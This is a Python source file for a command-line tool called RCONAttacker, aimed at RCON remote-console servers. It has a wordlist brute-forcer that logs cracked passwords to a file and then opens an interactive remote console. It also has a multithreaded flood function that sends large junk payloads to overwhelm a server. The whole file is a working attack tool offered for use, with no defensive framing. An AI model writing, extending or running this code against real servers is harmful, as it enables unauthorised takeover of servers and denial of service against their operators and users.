import mcrcon
from colorama import Fore, Style, init
import struct
import threading
import socket
import sys
import shutil
init(autoreset=True)

 
LOGGED = False
DEAD = False

def print_help():
    print(f"{Fore.YELLOW}[H] Usage:")
    print(f"{Fore.LIGHTMAGENTA_EX}python3 RCONAttacker.py  -r <host> <port> <password>  : Connect to RCON server using password.")
    print(f"{Fore.LIGHTMAGENTA_EX}python3 RCONAttacker.py  -b <host> <port> <file>     : Bruteforce RCON server using passwords from a file.")
    print(f"{Fore.LIGHTMAGENTA_EX}python3 RCONAttacker.py  -c <host> <port>         : Check if RCON server is online.")
    print(f"{Fore.LIGHTMAGENTA_EX}python3 RCONAttacker.py  -f <host> <port> <threads> <requests> : Flood RCON server with requests.")
    print(f"{Fore.LIGHTMAGENTA_EX}python3 RCONAttacker.py  -s                        : Commence interactive mode")      
    print(f"{Fore.LIGHTMAGENTA_EX}python3 RCONAttacker.py  -h                        : Print this help message.")
    print(f"{Fore.LIGHTMAGENTA_EX}python3 RCONAttacker.py  -h <command>              : Print help of a specfic command. e.g -h f")
def print_banner():
    art = """
     _____    _____   ____   _   _            _    _                 _                
    |  __ \  / ____| / __ \ | \ | |    /\    | |  | |               | |               
    | |__) || |     | |  | ||  \| |   /  \   | |_ | |_   __ _   ___ | | __  ___  _ __ 
    |  _  / | |     | |  | || . ` |  / /\ \  | __|| __| / _` | / __|| |/ / / _ \| '__|
    | | \ \ | |____ | |__| || |\  | / ____ \ | |_ | |_ | (_| || (__ |   < |  __/| |   
    |_|  \_\ \_____| \____/ |_| \_|/_/    \_\ \__| \__| \__,_| \___||_|\_\ \___||_|   
    """
    lines = art.splitlines()
    columns = shutil.get_terminal_size().columns
    for line in lines:
        if line.strip():
            print(Fore.RED + line.center(columns))

def hostname_to_ip(hostname):
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror:
        return hostname
def bruteforce_rcon(host, port, password, help=False):
    if not help:
        print(f"{Fore.YELLOW}[S] Bruteforcing RCON server at {host}:{port} with {len(password)} passwords")
        LOGGED = False
        for i in password:
            while not LOGGED:
                try:
                    with mcrcon.MCRcon(host, i, port) as mcr:
                        print(f"{Fore.YELLOW}[S] Logged in with password: ", i)
                        print(f"{Fore.CYAN}[T] Type 'exit' to exit the console")
                        with open ('success.txt', 'a') as f:
                            f.write(f"Logged in {host}:{port} with password: {i}\n")
                            print(f"{Fore.YELLOW}[S] Password saved to success.txt")
                        LOGGED = True
                        while True:
                            command = input(f"{Fore.GREEN}[C] Enter command: {Fore.WHITE}")
                            if command == "exit":
                                break
                            response = mcr.command(command)
                            print(" ")
                            print(f"{Fore.MAGENTA}{response}")
                        break
                except mcrcon.MCRconException as e:
                            if "Login failed" in str(e):
                                print(f"{Fore.RED}[E] Wrong Password: ", i)
                            else:
                                print(f"{Fore.RED}[E] Error: ", e)
                            break
                except struct.error as e:
                    print(f"{Fore.RED}[E] Error: ", e)
                    print(f"{Fore.RED}[E] Most likely server is offline or is not a RCON server.")
                    break
                except ConnectionRefusedError as e:
                    print(f"{Fore.RED}[E] Error: ", e)
                    print(f"{Fore.RED}[E] Most likely server is offline or is not a RCON server.")
                    break

    else:
        print(f"{Fore.LIGHTMAGENTA_EX}Usage: bruteforce <host> <port> <password>")
        print(f"{Fore.LIGHTMAGENTA_EX}Bruteforce RCON server using passwords from a file.")
        print(f"{Fore.LIGHTMAGENTA_EX}Example: bruteforce 10.12.19.2 25575 passwords.txt")
        print(f"{Fore.LIGHTMAGENTA_EX}HOST: IP address of the RCON server")
        print(f"{Fore.LIGHTMAGENTA_EX}PORT: Port of the RCON server")
        print(f"{Fore.LIGHTMAGENTA_EX}PASSWORD: Password to bruteforce")
        print(f"{Fore.LIGHTMAGENTA_EX}PASSWORDS.TXT: File containing passwords separated by new lines")
def connect_rcon(host, port, password, help=False):
    if not help:
        print(f"{Fore.YELLOW}[S] Connecting to RCON server at {host}:{port} with password: {password}")
        try:
            with mcrcon.MCRcon(host, password, port) as mcr:
                print(f"{Fore.YELLOW}[S] Logged in with password: ", password)
                print(f"{Fore.CYAN}[T] Type 'exit' to exit the console")
                with open ('success.txt', 'a') as f:
                    f.write(f"Logged in {host}:{port} with password: {password}")
                    f.close()
                while True:
                    command = input(f"{Fore.GREEN}[C] Enter command: {Fore.WHITE}")
                    if command == "exit":
                        break
                    response = mcr.command(command)
                    print(" ")
                    print(f"{Fore.MAGENTA}{response}")
        except mcrcon.MCRconException as e:
            print(f"{Fore.RED}[E] Error: ", e)
        except struct.error as e:
                    print(f"{Fore.RED}[E] Error: ", e)
                    print(f"{Fore.RED}[E] Most likely server is offline or is not a RCON server.")
        except ConnectionRefusedError as e:
            print(f"{Fore.RED}[E] Error: ", e)
            print(f"{Fore.RED}[E] Most likely server is offline or is not a RCON server.")
    else:
        print(f"{Fore.LIGHTMAGENTA_EX}Usage: connect <host> <port> <password>")
        print(f"{Fore.LIGHTMAGENTA_EX}Connect to RCON server using password.")
        print(f"{Fore.LIGHTMAGENTA_EX}Example: connect 10.12.19.2 25575 12345")
        print(f"{Fore.LIGHTMAGENTA_EX}HOST: IP address of the RCON server")
        print(f"{Fore.LIGHTMAGENTA_EX}PORT: Port of the RCON server")
        print(f"{Fore.LIGHTMAGENTA_EX}PASSWORD: Password to connect with")        
def read_passwords(file):
    passwordz = []
    with open(file, "r") as f:
        passwords = f.readlines()
        for i in passwords:
            passwordz.append(i.strip('\n'))
        return passwordz 
def check_rcon(host, port, help=False):
    if not help:
        print(f"{Fore.YELLOW}[S] Checking RCON server at {host}:{port}")
        try:
            with mcrcon.MCRcon(host, "", port) as mcr:
                return True
        except mcrcon.MCRconException as e:
            return True
        except struct.error as e:
            return False
    else:
        print(f"{Fore.LIGHTMAGENTA_EX}Usage: check <host> <port>")
        print(f"{Fore.LIGHTMAGENTA_EX}Check if the server is an RCON server.")
        print(f"{Fore.LIGHTMAGENTA_EX}Example: check 10.12.19.2 25575")
def flood_console(host, port, num_threads, num_requests_per_thread, help=False):
    if not help:
        print(f"{Fore.YELLOW}[S] Flooding RCON server at {host}:{port} with {num_threads} threads and {num_requests_per_thread} requests per thread")
        def send_requests(thread_id):
            for _ in range(num_requests_per_thread):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.connect((host, port))
                        s.sendall(b'Z\n' * 240448)
                        response = s.recv(240448).decode()
                except Exception as e:
                    print(f"Thread {thread_id}: Error: {str(e)}")
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=send_requests, args=(i, ))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
    else:
        print(f"{Fore.LIGHTMAGENTA_EX}Usage: flood <host> <port> <threads> <requests>")
        print(f"{Fore.LIGHTMAGENTA_EX}Flood RCON server with requests.")
        print(f"{Fore.LIGHTMAGENTA_EX}Example: flood 10.12.19.2 25575 10 100")
        print(f"{Fore.LIGHTMAGENTA_EX}HOST: IP address of the RCON server")
        print(f"{Fore.LIGHTMAGENTA_EX}PORT: Port of the RCON server")
        print(f"{Fore.LIGHTMAGENTA_EX}THREADS: Number of threads to use")
        print(f"{Fore.LIGHTMAGENTA_EX}REQUESTS: Number of requests per thread")
def interactive_mode():
    print_banner()
    while True:
        try:
            command = input(f"{Fore.GREEN}[C] Enter command: {Fore.WHITE}")
            if command == "exit":
                break
            elif command == "help":
                print(f"{Fore.YELLOW}[I] Commands: connect, bruteforce, check, flood, help, exit")
                print(f"{Fore.YELLOW}[I] Type 'help' for more information on a specific command.")
                print(f"{Fore.YELLOW}[I] Type 'help <command>' for more detailed information.")
                print(f"{Fore.YELLOW}[I] Type 'exit' to quit the program.")
            elif command.startswith("help "):
                parts = command.split(" ")[1]
                if parts == "connect":
                    connect_rcon("1", 1, "1", help=True)
                elif parts == "bruteforce":
                    bruteforce_rcon("1", 1, "1", help=True)
                elif parts == "check":
                    check_rcon("1", 1, help=True)
                elif parts == "flood":
                    flood_console("1", 1, 1, 1, help=True)
                else:
                    print(f"{Fore.RED}[E] Unknown command. Type 'help' for a list of commands.")
            elif command.startswith("flood"):
                try:
                    parts = command.split(" ")
                    host = parts[1]
                    host = hostname_to_ip(host)
                    port = int(parts[2])
                    num_threads = int(parts[3])
                    num_requests_per_thread = int(parts[4])
                    flood_console(host, port, num_threads, num_requests_per_thread)
                except IndexError:
                    print(f"{Fore.RED}[E] Error: Invalid input. Use format: flood <host> <port> <num_threads> <num_requests_per_thread>")
                except ValueError:
                    print(f"{Fore.RED}[E] Error: Invalid input. Use format: flood <num_threads> <num_requests_per_thread>")
            elif command.startswith("bruteforce"):
                try:
                    parts = command.split(" ")
                    host = parts[1]
                    host = hostname_to_ip(host)
                    port = int(parts[2])
                    password = parts[3]
                    bruteforce_rcon(host, port, read_passwords(password))
                except IndexError:
                    print(f"{Fore.RED}[E] Error: Invalid input. Use format: bruteforce <host> <port> <password>")
                except ValueError:
                    print(f"{Fore.RED}[E] Error: Invalid input. Use format: bruteforce <host> <port> <password>")
            elif command.startswith("connect"):
                try:
                    parts = command.split(" ")
                    host = parts[1]
                    host = hostname_to_ip(host)
                    port = int(parts[2])
                    password = parts[3]
                    connect_rcon(host, port, password)
                except IndexError:
                    print(f"{Fore.RED}[E] Error: Invalid input. Use format: connect <host> <port> <password>")
                except ValueError:
                    print(f"{Fore.RED}[E] Error: Invalid input. Use format: connect <host> <port> <password>")
            elif command.startswith("check"):
                try:
                    parts = command.split(" ")
                    host = parts[1]
                    host = hostname_to_ip(host)
                    port = int(parts[2])
                    if check_rcon(host, port):
                        print(f"{Fore.YELLOW}[S] RCON server is online at {host}:{port}")
                    else:
                        print(f"{Fore.RED}[E] RCON server is offline at {host}:{port}")
                except IndexError:
                    print(f"{Fore.RED}[E] Error: Invalid input. Use format: check <host> <port>")
                except ValueError:
                        print(f"{Fore.RED}[E] Error: Invalid input. Use format: check <host> <port>")           
            elif command.startswith("help"):
                print(f"{Fore.YELLOW}[I] Commands: connect, bruteforce, check, flood, help, exit")
                print(f"{Fore.YELLOW}[I] Type 'help' for more information on a specific command.")
                print(f"{Fore.YELLOW}[I] Type 'exit' to quit the program.")
            elif command.startswith("exit"):
                break
            else:
                print(f"{Fore.YELLOW}[I] Unknown command. Type 'help' for a list of commands.")
        except KeyboardInterrupt:
            print(f"{Fore.RED}\n[I] Interrupted by user.")
            break
        except Exception as e:
            print(f"{Fore.RED}\n[E] Error: {str(e)}")

def main():
    if len(sys.argv) < 2:
        print_help()
        sys.exit(0)
    elif sys.argv[1] == "-r":
        if len(sys.argv)!= 5:
            print_help()
            sys.exit(0)
        host = sys.argv[2]
        port = int(sys.argv[3])
        password = sys.argv[4]
        connect_rcon(host, port, password)
    elif sys.argv[1] == "-b":
        if len(sys.argv)!= 5:
            print_help()
            sys.exit(0)
        host = sys.argv[2]
        port = int(sys.argv[3])
        file = sys.argv[4]
        bruteforce_rcon(host, port, read_passwords(file))
    elif sys.argv[1] == "-c":
        if len(sys.argv)!= 4:
            print_help()
            sys.exit(0)
        host = sys.argv[2]
        port = int(sys.argv[3])
        if check_rcon(host, port):
            print(f"{Fore.YELLOW}[S] RCON server is online at {host}:{port}")
        else:
            print(f"{Fore.RED}[E] RCON server is offline at {host}:{port}")
    elif sys.argv[1] == "-f":
        if len(sys.argv)!= 6:
            print_help()
            sys.exit(0)
        host = sys.argv[2]
        port = int(sys.argv[3])
        num_threads = int(sys.argv[4])
        num_requests_per_thread = int(sys.argv[5])
        flood_console(host, port, num_threads, num_requests_per_thread)
        print(f"{Fore.YELLOW}[S] Flooding completed!")
    elif sys.argv[1] == "-h":
        if len(sys.argv)!= 2:
            if sys.argv[2] == "r":
                connect_rcon("1", 1, "1", help=True)
            elif sys.argv[2] == "b":
                bruteforce_rcon("1", 1, "1", help=True)
            elif sys.argv[2] == "c":
                check_rcon("1", 1, help=True)
            elif sys.argv[2] == "f":
                flood_console("1", 1, 1, 1, help=True)
        else:
            print_help()
        sys.exit(0)
    elif sys.argv[1] == "-s":
        interactive_mode()
    else:
        print_help()
        sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        exit()

